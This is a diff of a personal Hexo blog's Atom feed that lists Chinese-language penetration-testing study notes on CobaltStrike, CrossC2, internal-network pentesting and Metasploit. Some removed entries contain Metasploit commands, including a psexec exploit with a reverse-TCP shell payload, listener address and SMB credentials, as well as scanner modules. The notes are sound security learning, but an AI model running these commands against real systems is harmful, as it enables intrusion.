@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2021-07-31T03:37:26.747Z</updated>
+  <updated>2021-12-03T09:45:08.830Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,69 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CrossC2</title>
+    <link href="http://yoursite.com/posts/89b968f1.html"/>
+    <id>http://yoursite.com/posts/89b968f1.html</id>
+    <published>2021-10-03T09:35:32.000Z</published>
+    <updated>2021-12-03T09:45:08.830Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;CrossC2使用相关的笔记&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>内网渗透</title>
+    <link href="http://yoursite.com/posts/4e0a5250.html"/>
+    <id>http://yoursite.com/posts/4e0a5250.html</id>
+    <published>2021-08-04T09:35:20.000Z</published>
+    <updated>2021-12-03T09:41:36.558Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;小迪渗透内网部分的笔记&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>CobaltStrike学习笔记</title>
+    <link href="http://yoursite.com/posts/f39c1fdc.html"/>
+    <id>http://yoursite.com/posts/f39c1fdc.html</id>
+    <published>2021-08-03T09:23:08.000Z</published>
+    <updated>2021-12-03T09:33:44.117Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;CS官方教程的学习笔记，目前进度到Weaponization。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>靶机-Kioptrix2014</title>
@@ -44,7 +107,7 @@
     <link href="http://yoursite.com/posts/31832.html"/>
     <id>http://yoursite.com/posts/31832.html</id>
     <published>2021-07-07T02:40:02.000Z</published>
-    <updated>2021-08-02T01:32:18.250Z</updated>
+    <updated>2021-12-03T09:25:32.217Z</updated>
     
     <summary type="html">
     
@@ -53,9 +116,11 @@
     </summary>
     
     
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
     
-      <category term="靶机" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%B6%E6%9C%BA/"/>
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="靶机" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%B6%E6%9C%BA/"/>
     
     
   </entry>
@@ -65,7 +130,7 @@
     <link href="http://yoursite.com/posts/19385.html"/>
     <id>http://yoursite.com/posts/19385.html</id>
     <published>2021-05-31T02:39:20.000Z</published>
-    <updated>2021-07-31T03:37:26.745Z</updated>
+    <updated>2021-12-03T09:25:14.835Z</updated>
     
     <summary type="html">
     
@@ -112,7 +177,9 @@
     </summary>
     
     
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
     
   </entry>
@@ -521,115 +588,6 @@
 &lt;li&gt;&lt;p&gt;VNC无密码访问&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;p&gt;use auxiliary/scanner/vnc/vnc_none_auth&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MSF-信息收集、发现和端口扫描</title>
-    <link href="http://yoursite.com/posts/c2caaf54.html"/>
-    <id>http://yoursite.com/posts/c2caaf54.html</id>
-    <published>2020-11-26T08:16:47.000Z</published>
-    <updated>2021-07-31T03:55:02.371Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;MSF–信息收集&quot;&gt;&lt;a href=&quot;#MSF–信息收集&quot; class=&quot;headerlink&quot; title=&quot;MSF–信息收集&quot;&gt;&lt;/a&gt;MSF–信息收集&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;Nmap扫描&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;db_nmap -sV 192.168.0.1/24&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;Auxiliary扫描模块&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;主机发现&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;search arp&lt;/li&gt;
-&lt;li&gt;use auxiliary/scanner/discovery/arp_sweep&lt;/li&gt;
-&lt;li&gt;set INTERFACE RHOSTS SHOST SMAC THREADS &lt;/li&gt;
-&lt;li&gt;run&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MSF-exploit、payload、meterpreter、msfcli</title>
-    <link href="http://yoursite.com/posts/a3d911ff.html"/>
-    <id>http://yoursite.com/posts/a3d911ff.html</id>
-    <published>2020-11-25T08:24:43.000Z</published>
-    <updated>2021-07-31T03:55:02.376Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;Exploit&quot;&gt;&lt;a href=&quot;#Exploit&quot; class=&quot;headerlink&quot; title=&quot;Exploit&quot;&gt;&lt;/a&gt;Exploit&lt;/h4&gt;&lt;p&gt;以下两个用winserver2003测试成功。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;Active expolit&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;use exploit/windows/smb/psexec&lt;/li&gt;
-&lt;li&gt;set RHOST 1.1.1.14&lt;/li&gt;
-&lt;li&gt;set PAYLOAD windows/shell/reverse_tcp&lt;/li&gt;
-&lt;li&gt;set LHOST 1.1.1.10set LPORT 4444&lt;/li&gt;
-&lt;li&gt;set SMBUSER user1&lt;/li&gt;
-&lt;li&gt;set SMBPASS pass1&lt;/li&gt;
-&lt;li&gt;exploit&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;Passive exploit&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;search ms07_017&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MSF-基本命令</title>
-    <link href="http://yoursite.com/posts/96d11606.html"/>
-    <id>http://yoursite.com/posts/96d11606.html</id>
-    <published>2020-11-24T08:13:47.000Z</published>
-    <updated>2021-07-31T03:55:02.379Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;Metasploit&quot;&gt;&lt;a href=&quot;#Metasploit&quot; class=&quot;headerlink&quot; title=&quot;Metasploit&quot;&gt;&lt;/a&gt;Metasploit&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;目前最流行、最强大、最具拓展性的渗透测试平台软件&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;基于Metasploit进行渗透测试和漏洞分析的流程和方法&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;2003年由HD More发布第一版，2007年用ruby重写&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;集成了渗透测试标准（PETS）思想&lt;/li&gt;
-&lt;li&gt;一定程度上统一了渗透测试和漏洞研究的工作环境&lt;/li&gt;
-&lt;li&gt;新的攻击代码可以比较容易的加入框架&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;
     
     </summary>
     
